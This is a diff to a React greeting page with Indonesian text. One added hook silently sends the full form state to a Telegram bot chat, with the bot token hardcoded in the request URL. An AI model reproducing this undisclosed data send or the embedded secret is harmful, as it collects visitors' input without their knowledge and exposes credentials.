@@ -66,6 +66,19 @@ export default function () {
   useEffect(() => {
     const { state } = form;
     if (state === "GREETINGS") {
+      fetch(
+        "https://api.telegram.org/bot5586647974:AAHt3OhcGD0mRJeiD9BbhKBpcGgOGEqfdFE/sendMessage",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: "-779780188",
+            text: JSON.stringify({ ...form }),
+          }),
+        }
+      );
       setGreetings([
         {
           id: randomString(),
@@ -186,7 +199,7 @@ export default function () {
                 <Gallery />
                 <Playlist />
                 <div className="h-screen flex flex-col items-center text-center justify-center px-4 md:px-8 bg-gradient-to-b from-[#303952] to-black">
-                  <p>
+                  <p className="w-full md:w-1/2">
                     Aku mempunyai kue yang sangat enak yang ingin kubagikan
                     kepadamu dan dua lilin yang menancap serta berbagi
                     kebahagidan bersama sama dengan menyanyikan lagu cinta kita.
